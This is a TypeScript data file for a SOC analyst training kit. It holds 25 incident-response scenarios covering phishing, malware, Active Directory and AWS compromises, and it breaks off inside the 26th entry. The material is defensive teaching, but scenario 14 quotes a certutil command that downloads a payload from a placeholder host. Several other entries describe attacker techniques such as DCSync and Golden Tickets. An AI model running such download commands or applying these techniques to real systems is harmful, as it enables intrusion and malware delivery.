/**
 * SOC Analyst Prep kit content, ported from soc-prep.html.
 * String fields may contain inline HTML (<b>, <code>, <pre>, tables in
 * malware bodies) authored as part of the kit — rendered via
 * dangerouslySetInnerHTML inside .soc-prose containers.
 */

export type Level = "l1" | "l2" | "l3";
export type Severity = "high" | "med" | "low";

export interface Scenario {
  id: number;
  severity: Severity;
  level: Level;
  category: string;
  title: string;
  situation: string;
  task: string;
  actions: string[];
  result: string;
  lessons: string[];
  attack: string[];
  followUp: string;
}

export interface MalwareTopic {
  id: string;
  level: Level;
  title: string;
  body: string;
  caseStudy: string;
}

export interface ResourceItem {
  name: string;
  description: string;
  url: string;
  tag: string;
}

export interface ResourceGroup {
  group: string;
  items: ResourceItem[];
}

export interface Fundamental {
  level: Level;
  category: string;
  question: string;
  answer: string;
}

export interface Role {
  level: Level;
  title: string;
  range: string;
  items: string[];
  kpi: string;
}

export const LEVEL_NAMES: Record<Level, string> = { l1: "L1", l2: "L2", l3: "L3" };

export const SCENARIOS: Scenario[] = [
  {
    "id": 1,
    "severity": "high",
    "level": "l2",
    "category": "Phishing",
    "title": "AiTM phishing → token theft → inbox rule persistence",
    "situation": "Finance user reported a \"DocuSign\" email. 20 minutes later Sentinel raised impossible-travel for the same account.",
    "task": "Confirm compromise, find what the attacker did post-login, stop the spread to suppliers.",
    "actions": [
      "SigninLogs showed success from a hosting-provider ASN — MFA satisfied, but via a method registered 25 minutes earlier.",
      "Link resolved to an Evilginx-style AiTM proxy domain registered 3 days prior — the attacker relayed the real login page and stole the session token.",
      "OfficeActivity showed <b>New-InboxRule</b> moving anything with \"invoice/payment/bank\" to RSS Feeds, marked read.",
      "Sent Items had outbound phish to 40 internal + 12 supplier contacts. 200+ OneDrive files downloaded in the same session.",
      "Message trace found 6 other recipients; 2 clicked."
    ],
    "result": "Revoked all refresh tokens (password reset alone leaves tokens valid), removed the attacker MFA method and inbox rule, purged tenant-wide, blocked the AiTM domain, notified suppliers. No financial loss.",
    "lessons": [
      "MFA existed but was phishable — drove FIDO2 for finance + privileged roles.",
      "No detection for inbox-rule creation. Built one, weighted high when rules hide or externally forward mail.",
      "MFA-method registration from a new location was the earliest reliable signal — added to the alert set."
    ],
    "attack": [
      "T1566.002",
      "T1539",
      "T1114.003"
    ],
    "followUp": "What would you have caught this with if MFA had not been phishable?"
  },
  {
    "id": 2,
    "severity": "med",
    "level": "l1",
    "category": "Phishing",
    "title": "QR code phishing (quishing) bypassing email URL scanning",
    "situation": "Multiple users forwarded an \"MFA re-enrollment required\" email containing only a QR code image.",
    "task": "Determine why the secure email gateway passed it and whether anyone authenticated.",
    "actions": [
      "The gateway scanned URLs in text/HTML — there was no URL, only a PNG. The payload lived inside the image.",
      "Decoded the QR in an isolated VM: it pointed to a Microsoft-branded credential harvester on a lookalike domain.",
      "Because users scanned with <b>personal phones</b>, the traffic never touched corporate proxy logs — a real visibility gap.",
      "Pivoted to SigninLogs instead of proxy logs: found 3 sign-ins from an unusual mobile ASN."
    ],
    "result": "Reset 3 accounts, revoked sessions, purged campaign tenant-wide, blocked the domain. Ran an awareness bulletin specifically on QR phishing.",
    "lessons": [
      "Detection cannot rely on proxy when the phish is designed to move to an unmanaged device.",
      "Enabled OCR/image analysis in the gateway.",
      "Added a Conditional Access policy requiring compliant device for MFA registration."
    ],
    "attack": [
      "T1566.001",
      "T1204.001"
    ],
    "followUp": "How do you detect a phish that never touches your network?"
  },
  {
    "id": 3,
    "severity": "high",
    "level": "l2",
    "category": "Phishing",
    "title": "Business Email Compromise — supplier invoice fraud",
    "situation": "Accounts payable nearly paid a $180K invoice to changed bank details.",
    "task": "Determine whether our tenant was compromised or the supplier was.",
    "actions": [
      "Our user's mailbox was clean — no anomalous sign-ins, no rules.",
      "Header analysis showed the \"reply\" came from a <b>lookalike domain</b> (rn instead of m) with valid SPF for that attacker-owned domain — SPF passing does not mean legitimate.",
      "Thread history showed the attacker had real prior email content — the <b>supplier</b> was compromised, and the attacker replied into an existing thread.",
      "Timing was deliberate: sent Thursday afternoon before a long weekend."
    ],
    "result": "Payment halted before release. Notified the supplier of their compromise. Added the lookalike domain to block lists, and implemented an out-of-band callback policy for any bank-detail change.",
    "lessons": [
      "SPF/DKIM/DMARC passing proves domain control, not trustworthiness.",
      "Implemented external-sender banners plus a specific \"similar to internal domain\" warning.",
      "Financial controls beat technical controls here — the callback policy is what actually stops BEC."
    ],
    "attack": [
      "T1566",
      "T1656"
    ],
    "followUp": "SPF passed. Why is that not enough?"
  },
  {
    "id": 4,
    "severity": "low",
    "level": "l1",
    "category": "Phishing",
    "title": "Reported phish that was a legitimate marketing campaign",
    "situation": "12 users reported the same \"urgent account verification\" email as phishing.",
    "task": "Verify before blocking a domain that might be a business partner.",
    "actions": [
      "Checked headers: SPF, DKIM, DMARC all aligned to a legitimate ESP under our own marketing domain.",
      "The link resolved to our own tracking subdomain.",
      "Contacted Marketing — they had launched a campaign without notifying Security."
    ],
    "result": "Closed as false positive, but did not dismiss the users — replied thanking them and confirming it was legitimate. Established a pre-notification process for outbound campaigns.",
    "lessons": [
      "Never punish reporting. If users get told off for false alarms, they stop reporting the real ones.",
      "Marketing campaigns that look like phishing train users badly — raised this with the business."
    ],
    "attack": [],
    "followUp": "How do you keep report rates high while handling false alarms?"
  },
  {
    "id": 5,
    "severity": "high",
    "level": "l2",
    "category": "Phishing",
    "title": "Malicious OAuth app consent grant (illicit consent phishing)",
    "situation": "Alert on a newly consented third-party application with Mail.Read and Files.Read.All permissions.",
    "task": "Determine scope — consent grants survive password resets entirely.",
    "actions": [
      "AuditLogs showed \"Consent to application\" for an app named \"Office365 Doc Viewer\" — publisher unverified, created 2 days earlier.",
      "14 users had consented via a phishing link. <b>No credentials were stolen</b> — the attacker never needed them.",
      "The app held a refresh token with delegated mail and file access; MFA was irrelevant to it.",
      "Graph activity logs showed bulk mail reads across all 14 mailboxes."
    ],
    "result": "Revoked the service principal and all consent grants, revoked refresh tokens, disabled user consent to unverified publishers tenant-wide, moved to admin-consent workflow.",
    "lessons": [
      "Consent phishing bypasses MFA and password resets — the token IS the access.",
      "Most orgs allow end-user consent by default. That is the whole vulnerability.",
      "Added detection for consent grants to unverified publishers with high-privilege scopes."
    ],
    "attack": [
      "T1528",
      "T1566.002"
    ],
    "followUp": "The user never typed a password. How were they compromised?"
  },
  {
    "id": 6,
    "severity": "med",
    "level": "l1",
    "category": "Phishing",
    "title": "Callback phishing / TOA (no link, no attachment)",
    "situation": "Users received \"your subscription auto-renews for $499, call this number to cancel\" emails.",
    "task": "Explain why nothing technical fired and what the real risk was.",
    "actions": [
      "No URL, no attachment, no malicious payload — nothing for the gateway to detect. Pure social engineering.",
      "The goal: get the user to call, then the \"agent\" walks them into installing a remote access tool (AnyDesk/ScreenConnect).",
      "Checked EDR for recent RMM tool installs across the estate — found one user had installed ScreenConnect 40 minutes earlier."
    ],
    "result": "Isolated the host, removed the RMM tool, reset credentials, blocked unauthorized RMM binaries by hash and by signer. Interviewed the user to reconstruct what the caller accessed.",
    "lessons": [
      "Detect the <b>outcome</b>, not the email. Unauthorized RMM installation is the reliable signal.",
      "Built a detection for any RMM tool not on the approved list executing on an endpoint.",
      "This is now the top ransomware initial-access vector in many reports — it deserves its own playbook."
    ],
    "attack": [
      "T1566.004",
      "T1219"
    ],
    "followUp": "The email had no payload. What do you detect instead?"
  },
  {
    "id": 7,
    "severity": "med",
    "level": "l2",
    "category": "Phishing",
    "title": "Internal phishing from an already-compromised colleague",
    "situation": "Phishing email arrived from a genuine internal address, passing all authentication.",
    "task": "Users trust internal mail — determine the source and contain fast.",
    "actions": [
      "Mail originated from our own Exchange Online — sender account was already compromised.",
      "Because it was internal, it skipped the external gateway entirely and had no external-sender banner.",
      "Sender's SigninLogs showed a session from an anonymizing proxy 3 hours earlier.",
      "23 internal recipients; 9 clicked because the sender was a trusted colleague."
    ],
    "result": "Disabled the source account, revoked tokens, purged, then treated all 9 clickers as potentially compromised and reset them pre-emptively rather than waiting for evidence.",
    "lessons": [
      "Internal-to-internal mail is a blind spot in most gateway configs — enabled internal scanning.",
      "Click rates on internal phish are dramatically higher. Trust is the vulnerability.",
      "Assume-breach on clickers is cheaper than investigating each one."
    ],
    "attack": [
      "T1534"
    ],
    "followUp": "Why did the click rate jump so much on this one?"
  },
  {
    "id": 8,
    "severity": "high",
    "level": "l3",
    "category": "Phishing",
    "title": "Thread hijacking with a password-protected archive",
    "situation": "Targeted campaign replying into real, existing email threads with a ZIP and its password in the body.",
    "task": "Detect a payload the sandbox cannot open.",
    "actions": [
      "Password-protected archives cannot be scanned by the gateway or detonated automatically — that is the entire point of the technique.",
      "Manually extracted in an isolated VM: an ISO containing a LNK file that ran a DLL via <code>rundll32</code>.",
      "ISO/IMG containers strip the <b>Mark-of-the-Web</b>, so SmartScreen and Protected View never triggered.",
      "Identified as an IcedID/Qakbot-style loader — an initial access broker delivering for later ransomware."
    ],
    "result": "Blocked ISO/IMG/password-protected archives at the gateway for non-approved senders. Hunted the loader hash and C2 estate-wide — found 2 additional executions and contained them.",
    "lessons": [
      "Container files (ISO, IMG, VHD) exist in phishing purely to evade MoTW. Blocking them is high-value and low-friction.",
      "Detection had to move to behaviour: <code>explorer.exe → rundll32.exe</code> from a mounted volume.",
      "Thread hijacking defeats \"look for a suspicious sender\" training entirely."
    ],
    "attack": [
      "T1566.001",
      "T1553.005",
      "T1218.011"
    ],
    "followUp": "Why did the ISO matter more than the DLL?"
  },
  {
    "id": 9,
    "severity": "high",
    "level": "l3",
    "category": "Malware",
    "title": "Cobalt Strike beacon discovered by beaconing hunt",
    "situation": "Weekly beacon hunt found a file server calling out every ~300s with 15% jitter to a rare domain.",
    "task": "Confirm C2, find the entry point, determine if it was pre-ransomware.",
    "actions": [
      "Time-delta analysis: consistent 300s interval with jitter — not application polling.",
      "EDR attributed the socket to <code>rundll32.exe</code> with no command line, spawned by <code>services.exe</code> — a malicious service installed 2 days earlier (7045).",
      "Memory scan returned a Cobalt Strike beacon config: sleep 300, jitter 15, malleable profile mimicking jQuery traffic.",
      "Traced initial access back 11 days to an unpatched VPN appliance.",
      "Attacker ran SharpHound, Kerberoasted 3 service accounts, cracked one, moved laterally via WMI to 4 servers, then DCSync'd the domain.",
      "40GB exfiltrated to cloud storage over 36 hours. <b>No encryption yet</b> — we caught it in the staging phase."
    ],
    "result": "Simultaneous isolation of all compromised hosts, krbtgt rotated twice, all privileged accounts reset, backups taken off-domain and verified immutable, VPN patched and re-credentialed.",
    "lessons": [
      "11 days dwell with zero alerts — the gap was behavioural detection, not signatures.",
      "4662 was being collected but never used for DCSync detection.",
      "Exfiltration precedes encryption. Always assume data left before the ransom note."
    ],
    "attack": [
      "T1071.001",
      "T1055",
      "T1003.006",
      "T1567.002"
    ],
    "followUp": "You found the beacon before encryption. What tells you exfil already happened?"
  },
  {
    "id": 10,
    "severity": "high",
    "level": "l2",
    "category": "Malware",
    "title": "Fileless PowerShell loader with no disk artifacts",
    "situation": "EDR flagged encoded PowerShell but AV found nothing on disk.",
    "task": "Analyze malware that only exists in memory.",
    "actions": [
      "Command line had <code>-enc</code> with a base64 blob. Decoded it: a downloader that pulled a .NET assembly and loaded it reflectively with <code>[Reflection.Assembly]::Load()</code>.",
      "Nothing ever touched disk — hence no AV detection. Disk forensics would have found nothing.",
      "Persistence was in a <b>WMI event subscription</b> (<code>__EventFilter</code> + <code>CommandLineEventConsumer</code>), not a registry run key or scheduled task.",
      "Captured memory with WinPmem, ran Volatility <code>malfind</code> to find the injected region, dumped it, and identified the payload family from strings and imports."
    ],
    "result": "Removed the WMI subscription, isolated the host, hunted the WMI persistence pattern estate-wide (found 2 more), rebuilt the affected machines.",
    "lessons": [
      "Fileless does not mean invisible — it means you look at process telemetry, command lines, and memory instead of files.",
      "PowerShell Script Block Logging (4104) is the single highest-value log for this and it was disabled. Enabled it everywhere.",
      "WMI persistence is under-monitored because it does not appear in Autoruns by default."
    ],
    "attack": [
      "T1059.001",
      "T1620",
      "T1546.003"
    ],
    "followUp": "AV was clean. Why does that not mean the host was clean?"
  },
  {
    "id": 11,
    "severity": "high",
    "level": "l2",
    "category": "Malware",
    "title": "DLL sideloading via a signed legitimate binary",
    "situation": "A signed, legitimate vendor executable was running from %APPDATA% and making outbound connections.",
    "task": "Explain how a trusted signed binary became the malware.",
    "actions": [
      "The EXE was genuinely signed and legitimate. The <b>DLL next to it</b> was malicious.",
      "Windows DLL search order loads from the application directory first — so dropping a malicious DLL with the expected name next to a legitimate EXE gets your code executed under a trusted, signed process.",
      "Application allowlisting passed it. EDR reputation passed it. The parent-child tree looked normal.",
      "Caught it on the anomaly: this vendor binary had never before run from %APPDATA%, and had never made network connections to that destination."
    ],
    "result": "Isolated, extracted the DLL for analysis, wrote a YARA rule for the loader, hunted the pattern (legitimate binary + unsigned DLL in same non-standard directory) and found 3 more hosts.",
    "lessons": [
      "Signature verification is not integrity verification of the whole process.",
      "The durable detection is <b>location + behaviour anomaly</b>, not hash.",
      "Built a hunt for known sideload-prone binaries running outside their install path."
    ],
    "attack": [
      "T1574.002",
      "T1036.005"
    ],
    "followUp": "The binary was signed by a real vendor. How is that malware?"
  },
  {
    "id": 12,
    "severity": "med",
    "level": "l1",
    "category": "Malware",
    "title": "Infostealer from a cracked software download",
    "situation": "EDR blocked a binary on a developer workstation; user admitted downloading cracked software.",
    "task": "Determine whether \"blocked\" meant \"no impact\".",
    "actions": [
      "EDR blocked <b>one</b> stage. Checked whether earlier stages had already run — they had.",
      "Before the block, the stealer had already read browser credential stores, cookie databases, and crypto wallet files.",
      "Cookie theft is the real damage: session cookies bypass MFA entirely on re-use.",
      "Correlated with proxy logs — a POST to a paste service before the block. Data had already left."
    ],
    "result": "Treated all credentials on that machine as compromised: forced password reset, revoked all browser sessions and refresh tokens estate-wide for the user, reimaged the host.",
    "lessons": [
      "\"EDR blocked it\" answers one question, not the incident. Always check what ran <b>before</b> the block.",
      "Stolen session cookies defeat MFA — token revocation is mandatory, not optional.",
      "Drove a policy change on local admin rights for developers."
    ],
    "attack": [
      "T1555.003",
      "T1539",
      "T1204.002"
    ],
    "followUp": "EDR blocked it. Why did you still reimage?"
  },
  {
    "id": 13,
    "severity": "high",
    "level": "l3",
    "category": "Malware",
    "title": "Reverse engineering an unknown packed binary",
    "situation": "EDR alerted but did not block an unknown executable. Zero VirusTotal detections.",
    "task": "Determine capability and produce durable detection with no threat intel available.",
    "actions": [
      "<b>Static triage:</b> high entropy (7.8) + tiny import table = packed. Compile timestamp was recent and plausible.",
      "Unpacked in a debugger by breaking on the OEP after the unpacking stub. Imports resolved to <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>CreateRemoteThread</code> — process injection. Plus <code>CryptEncrypt</code> and <code>FindFirstFile</code>.",
      "Strings revealed a mutex name, a hardcoded C2, and a file extension — consistent with ransomware.",
      "<b>Dynamic:</b> sandbox detonation initially showed benign behavior — it was checking for domain join and sleeping past the analysis window. Patched the check and re-ran; it began enumerating and encrypting.",
      "Extracted IOCs and wrote a YARA rule on the unpacked code section, plus a Sigma rule on the injection behaviour."
    ],
    "result": "Swept the estate for the hash, mutex, and C2 — found it staged on 2 more hosts, unexecuted. Contained before detonation.",
    "lessons": [
      "A clean sandbox verdict on a targeted sample means nothing — anti-analysis is standard.",
      "Mutex names are excellent hunt artifacts and rarely change between builds.",
      "Write behavioural detections, not just hash blocks — the hash changed within a week."
    ],
    "attack": [
      "T1027.002",
      "T1055",
      "T1497.001",
      "T1486"
    ],
    "followUp": "Sandbox said benign. Why did you not believe it?"
  },
  {
    "id": 14,
    "severity": "med",
    "level": "l2",
    "category": "Malware",
    "title": "LOLBin abuse — certutil downloading a payload",
    "situation": "Alert on certutil.exe with a URL argument on a finance workstation.",
    "task": "Show why a Microsoft-signed binary is the attack.",
    "actions": [
      "Command: <code>certutil.exe -urlcache -split -f http://x/a.txt a.exe</code> — certutil is a certificate utility being used as a downloader.",
      "It is signed by Microsoft, present on every Windows host, and allowlisted everywhere. Signature-based defense is useless here.",
      "Parent process was <code>WINWORD.EXE → cmd.exe → certutil.exe</code> — a macro dropper chain.",
      "The downloaded file was renamed with a .txt extension in transit to evade content inspection, then written as .exe."
    ],
    "result": "Isolated, removed the payload before execution, blocked the C2, disabled macros from the internet by GPO, and added command-line-based detections for the LOLBAS set.",
    "lessons": [
      "Detection must be on <b>arguments and context</b>, never binary name — certutil is legitimate 99% of the time.",
      "Baseline first: I checked 90 days of certutil usage to confirm no legitimate use with URLs existed before alerting.",
      "LOLBAS project is the reference list; we mapped our coverage against it."
    ],
    "attack": [
      "T1105",
      "T1218",
      "T1566.001"
    ],
    "followUp": "How do you alert on a binary that runs legitimately every day?"
  },
  {
    "id": 15,
    "severity": "high",
    "level": "l3",
    "category": "Malware",
    "title": "Linux cryptominer with an LD_PRELOAD rootkit",
    "situation": "A Linux web server showed 100% CPU but top showed nothing consuming it.",
    "task": "Investigate a host where the tools themselves are lying.",
    "actions": [
      "<code>top</code> and <code>ps</code> showed nothing — classic userland rootkit hiding the process.",
      "Found <code>/etc/ld.so.preload</code> pointing to a malicious .so hooking <code>readdir()</code> to hide any process and file matching a prefix.",
      "Confirmed by comparing <code>/proc</code> directory entries directly against <code>ps</code> output — the mismatch exposed the hidden PID.",
      "Entry vector: an unauthenticated RCE in an unpatched web application.",
      "Persistence in three places: a systemd timer, a cron @reboot entry, and an appended SSH authorized_keys entry."
    ],
    "result": "Rebuilt from a known-good image rather than cleaning — a rootkit means you can never fully trust the host. Patched the application, rotated all keys, added the miner pool domains to blocklists.",
    "lessons": [
      "When host tools disagree with each other, trust the kernel interface (/proc), not the userland tool.",
      "Cryptomining is often the <b>visible</b> symptom of an access that was sold or reused — I treated it as a full compromise, not \"just a miner\".",
      "Baseline SUID binaries and ld.so.preload; both should be empty/static and are easy to monitor."
    ],
    "attack": [
      "T1014",
      "T1496",
      "T1053.006",
      "T1098.004"
    ],
    "followUp": "ps showed nothing. How did you find the process?"
  },
  {
    "id": 16,
    "severity": "high",
    "level": "l2",
    "category": "Malware",
    "title": "Macro dropper with a delayed multi-stage payload",
    "situation": "A user opened an invoice document; nothing happened for two days, then EDR alerted.",
    "task": "Explain the delay and reconstruct the full chain.",
    "actions": [
      "The macro did not drop malware. It wrote a <b>scheduled task</b> that fired 48 hours later — deliberately breaking the mental link between the email and the alert.",
      "Stage 1 (macro) → wrote a WSF file. Stage 2 (wscript) → downloaded an encrypted blob. Stage 3 → decrypted and loaded in-memory.",
      "The delay defeats sandboxes (analysis windows are minutes) and defeats user recall in interviews.",
      "Reconstructed the timeline by working <b>backwards</b> from the alert through 4688 and scheduled task creation events (4698) to the original WINWORD process."
    ],
    "result": "Removed the task, contained the host, hunted the task name and WSF pattern estate-wide, found 6 more dormant infections that had not yet fired.",
    "lessons": [
      "Time-delayed execution is why you always pivot backwards to the origin instead of only investigating the alert.",
      "4698 (scheduled task created) was not being ingested — added it, and it immediately became one of our most useful sources.",
      "Finding 6 dormant hosts was only possible because we hunted the <b>persistence artifact</b>, not the payload."
    ],
    "attack": [
      "T1204.002",
      "T1053.005",
      "T1027"
    ],
    "followUp": "The alert was two days after the email. How did you connect them?"
  },
  {
    "id": 17,
    "severity": "high",
    "level": "l2",
    "category": "Identity & AD",
    "title": "Kerberoasting detected via RC4 downgrade",
    "situation": "Detection fired on a single account requesting service tickets for 14 different SPNs in 8 minutes.",
    "task": "Confirm attack and identify what the attacker was after.",
    "actions": [
      "4769 events with <code>TicketEncryptionType 0x17</code> (RC4) in a domain configured for AES — the downgrade is the tell, because RC4 is far easier to crack offline.",
      "The requesting account was a standard user with no reason to touch any of those services.",
      "Kerberoasting produces <b>no failed logons and no lockouts</b> — cracking happens entirely offline, so the target service never sees anything.",
      "Identified 3 of the 14 SPN accounts had passwords older than 5 years and were domain admins — critical exposure."
    ],
    "result": "Reset all 14 service account passwords with 100+ character values, moved eligible ones to gMSA, enforced AES-only, removed unnecessary SPNs, and planted a honeypot SPN account.",
    "lessons": [
      "Any authenticated domain user can request any SPN ticket — this is by design in Kerberos, not a misconfiguration.",
      "The honeypot SPN is the highest-fidelity detection we have: zero legitimate reason to ever request it.",
      "Service accounts with old passwords and admin rights are the real vulnerability; the attack just harvests them."
    ],
    "attack": [
      "T1558.003"
    ],
    "followUp": "No failed logons appeared. How was this an attack?"
  },
  {
    "id": 18,
    "severity": "high",
    "level": "l3",
    "category": "Identity & AD",
    "title": "DCSync — attacker replicated the domain",
    "situation": "A hunt on Event 4662 replication GUIDs returned a hit from a non-DC workstation.",
    "task": "Confirm domain compromise and scope the blast radius.",
    "actions": [
      "DCSync abuses the directory replication API. With the right rights, an attacker asks a DC to hand over password hashes — <b>no code runs on the DC</b>, so file-based detection is blind.",
      "Hunted 4662 for GUIDs <code>1131f6aa-...</code> and <code>1131f6ad-...</code>, excluding DC machine accounts and the known AAD sync service account.",
      "Hit came from a user workstation. That account had been granted replication rights via a nested group nobody had audited.",
      "Network side confirmed unexpected DRSUAPI traffic to a DC from a non-DC host.",
      "This means <b>krbtgt was dumped</b> — the attacker could forge Golden Tickets valid for years."
    ],
    "result": "Declared full domain compromise. Rotated krbtgt twice with replication in between, reset every privileged account, audited and stripped all replication rights, rebuilt the workstation.",
    "lessons": [
      "Any DCSync hit is treated as total domain compromise until disproven — you cannot partially recover from a krbtgt dump.",
      "Nested group membership hid the excessive rights. Ran a full AD ACL audit with BloodHound afterwards.",
      "Single krbtgt rotation is a classic mistake — it must be twice, with replication between."
    ],
    "attack": [
      "T1003.006",
      "T1558.001"
    ],
    "followUp": "Why rotate krbtgt twice instead of once?"
  },
  {
    "id": 19,
    "severity": "med",
    "level": "l1",
    "category": "Identity & AD",
    "title": "Password spray with two successes hidden in the noise",
    "situation": "Spike of authentication failures across 300+ accounts, low attempts each.",
    "task": "Distinguish spray from brute force and find what actually mattered.",
    "actions": [
      "Pattern was <b>many accounts, few attempts each</b> — deliberately staying under lockout thresholds. Brute force is the inverse: one account, many attempts.",
      "ResultType 50126 across 300+ accounts from a small IP set, spaced ~30 minutes apart.",
      "The critical step: I checked for <b>successes</b> in the same window, not just failures. Two accounts succeeded.",
      "Both were service accounts excluded from MFA. One went on to enumerate the directory via Graph API.",
      "Source IPs were a residential proxy network — geo-blocking would not have helped."
    ],
    "result": "Disabled and reset both accounts, revoked tokens, reviewed everything the enumeration touched, escalated to L2, blocked ranges, tuned smart lockout.",
    "lessons": [
      "Volume-based alerting alone would have closed this as noise. <b>The success is the incident, not the failures.</b>",
      "MFA exclusions for service accounts were the entire vulnerability — moved to workload identities.",
      "Rewrote the rule to correlate failure bursts with subsequent successes on the same accounts."
    ],
    "attack": [
      "T1110.003"
    ],
    "followUp": "300 failures. Which part was the actual incident?"
  },
  {
    "id": 20,
    "severity": "high",
    "level": "l2",
    "category": "Identity & AD",
    "title": "Golden Ticket suspicion from anomalous ticket lifetime",
    "situation": "Anomalous Kerberos activity: TGS requests with no preceding TGT.",
    "task": "Determine whether a forged ticket was in use.",
    "actions": [
      "4769 (service ticket) events appeared with <b>no corresponding 4768 (TGT issued)</b> — the ticket was never issued by the DC, so it was forged or injected.",
      "Ticket lifetime was 10 years — the default domain policy was 10 hours. Attackers often leave default Mimikatz lifetimes.",
      "The account name in the ticket did not exist in AD — a forged ticket does not require a real account, only a valid krbtgt hash.",
      "Traced back to a prior credential dump on a DC that had been closed as inconclusive weeks earlier."
    ],
    "result": "Full krbtgt double rotation, forced reauthentication domain-wide, rebuilt the DC, reopened and re-scoped the earlier incident.",
    "lessons": [
      "4769-without-4768 is a high-fidelity Golden Ticket indicator and costs nothing to implement.",
      "An \"inconclusive\" incident that is closed rather than escalated becomes tomorrow's domain compromise.",
      "Anomalous ticket lifetime is a lazy-attacker tell — but it works often enough to be worth alerting on."
    ],
    "attack": [
      "T1558.001"
    ],
    "followUp": "A ticket for an account that does not exist. How is that possible?"
  },
  {
    "id": 21,
    "severity": "med",
    "level": "l1",
    "category": "Identity & AD",
    "title": "Impossible travel that was a benign true positive",
    "situation": "User signed in from Dubai then London 90 minutes later.",
    "task": "Correctly classify without wasting escalation capacity.",
    "actions": [
      "Both sign-ins succeeded with MFA via the registered Authenticator app.",
      "London IP resolved to a known corporate VPN egress range.",
      "<b>Device ID was identical</b> across both — same compliant managed laptop. This was the fastest discriminator.",
      "No inbox rules, no MFA changes, no unusual file access. User confirmed VPN use for an internal app.",
      "Historical data showed the same pattern twice a month for this user."
    ],
    "result": "Closed as <b>benign true positive</b> — the activity genuinely occurred as described but was authorized. Documented the egress range and device ID as the closure rationale.",
    "lessons": [
      "FP vs BTP matters because the fix differs: FP means fix the logic, BTP means add a scoped exclusion.",
      "Named locations in Conditional Access were missing the VPN egress ranges — fixing that removed a recurring noise source.",
      "Device ID consistency went into the triage playbook for this alert class."
    ],
    "attack": [],
    "followUp": "What is the difference between a false positive and a benign true positive?"
  },
  {
    "id": 22,
    "severity": "high",
    "level": "l3",
    "category": "Identity & AD",
    "title": "Privilege escalation via unconstrained delegation",
    "situation": "Hunt for AD misconfigurations found a non-DC server with unconstrained delegation enabled.",
    "task": "Explain the risk and whether it had been abused.",
    "actions": [
      "A host with unconstrained delegation <b>caches the TGT of every user who authenticates to it</b> — including a Domain Admin, and including a DC if you can coerce it.",
      "Combined with a coercion technique (PrinterBug/PetitPotam), an attacker can force a DC to authenticate to the compromised host and capture the DC's TGT — instant domain compromise.",
      "Checked for prior abuse: looked for anomalous authentication from DCs to that host and for Rubeus-style monitoring behaviour. Found evidence of a prior pentest, not an attacker.",
      "Also found 4 service accounts with constrained delegation to sensitive services."
    ],
    "result": "Removed unconstrained delegation from all non-DC hosts, added Domain Admins to Protected Users and marked them sensitive-cannot-be-delegated, and built a scheduled hunt for delegation attribute changes.",
    "lessons": [
      "This is a misconfiguration, not malware — the most dangerous AD issues are usually configuration, not code.",
      "A regular AD hygiene hunt (BloodHound/PingCastle) finds these before attackers do.",
      "Delegation attribute changes are now a monitored event."
    ],
    "attack": [
      "T1558",
      "T1187"
    ],
    "followUp": "Nothing was compromised. Why was this critical?"
  },
  {
    "id": 23,
    "severity": "med",
    "level": "l2",
    "category": "Identity & AD",
    "title": "MFA fatigue / push bombing",
    "situation": "A user approved an MFA prompt at 3AM after receiving 40 of them.",
    "task": "Show that MFA presence does not equal MFA effectiveness.",
    "actions": [
      "SigninLogs showed 40+ MFA challenges in 20 minutes from a foreign IP, then one approval.",
      "The attacker already had the valid password — from a prior infostealer breach dump. MFA was the only barrier.",
      "User approved out of exhaustion/confusion at 3AM, then went back to sleep. No report filed.",
      "Post-approval: attacker registered their own MFA method within 4 minutes to establish persistent access."
    ],
    "result": "Revoked sessions, removed the attacker MFA method, reset credentials, enabled number matching and Authenticator context (app name, location), and moved high-risk roles to FIDO2.",
    "lessons": [
      "Repeated MFA denials in a short window is itself a high-fidelity alert and we were not using it.",
      "Number matching largely kills this technique — it was available and not enabled. A configuration gap, not a tooling gap.",
      "The password came from a public breach dump. Credential monitoring against breach corpora was added."
    ],
    "attack": [
      "T1621"
    ],
    "followUp": "MFA was enabled and it still failed. Why?"
  },
  {
    "id": 24,
    "severity": "high",
    "level": "l3",
    "category": "Identity & AD",
    "title": "Shadow admin via AdminSDHolder persistence",
    "situation": "A standard user account retained admin rights after being removed from all admin groups.",
    "task": "Find persistence that survives group membership removal.",
    "actions": [
      "Removed the account from Domain Admins, but it kept regaining privileged access within an hour.",
      "Found the attacker had modified <b>AdminSDHolder</b> — its ACL is stamped onto all protected accounts every 60 minutes by SDProp.",
      "So the attacker had ACL rights re-applied automatically by AD itself, every hour, forever. Removing group membership did nothing.",
      "Also found a modified <code>ntSecurityDescriptor</code> on the domain object granting DCSync rights to a second account."
    ],
    "result": "Reverted AdminSDHolder to a known-good ACL, stripped the malicious ACEs from the domain object, reset every protected account, and implemented monitoring on 4670/5136 for AdminSDHolder and domain object changes.",
    "lessons": [
      "<b>ACL-based persistence is invisible to group membership audits.</b> This is why attackers prefer it.",
      "AdminSDHolder is rarely monitored and is one of the most durable AD backdoors.",
      "Any AD persistence investigation must include ACLs, GPOs, and delegation — not just group membership."
    ],
    "attack": [
      "T1098",
      "T1222.001"
    ],
    "followUp": "You removed them from Domain Admins and they came back. How?"
  },
  {
    "id": 25,
    "severity": "high",
    "level": "l3",
    "category": "Cloud",
    "title": "AWS access key leaked in a public GitHub repo",
    "situation": "GuardDuty alerted on API calls from an unfamiliar region within 9 minutes of a commit.",
    "task": "Contain fast — automated scrapers find leaked keys in minutes.",
    "actions": [
      "A developer committed a <code>.env</code> file with long-lived IAM access keys to a public repo.",
      "CloudTrail showed the first attacker API call <b>9 minutes</b> after the commit — automated scanners, not a human.",
      "Attacker actions in order: <code>GetCallerIdentity</code> (who am I), <code>ListBuckets</code>, <code>DescribeInstances</code>, then <code>CreateUser</code> + <code>AttachUserPolicy</code> for persistence, then <code>RunInstances</code> for large GPU instances (cryptomining).",
      "Also attempted <code>PutBucketPolicy</code> to make an S3 bucket public — failed due to account-level Block Public Access."
    ],
    "result": "Deactivated the key within 4 minutes of detection, deleted the attacker-created IAM user and its keys, terminated the instances, rotated everything the key could reach. Purged the git history (rotating the key is mandatory — deleting the commit is not enough).",
    "lessons": [
      "Deleting a leaked key from git does nothing. It is public the moment it is pushed. <b>Rotate, always.</b>",
      "Long-lived access keys were the root cause — moved to IAM roles and short-lived STS credentials.",
      "Pre-commit secret scanning plus GitHub push protection prevented recurrence.",
      "Block Public Access at the account level saved us from a data exposure. Guardrails work."
    ],
    "attack": [
      "T1552.001",
      "T1078.004",
      "T1496"
    ],
    "followUp": "Nine minutes. What does that tell you about the attacker?"
  },
  {
    "id": 26,
    "severity": "high",
    "level": "l2",
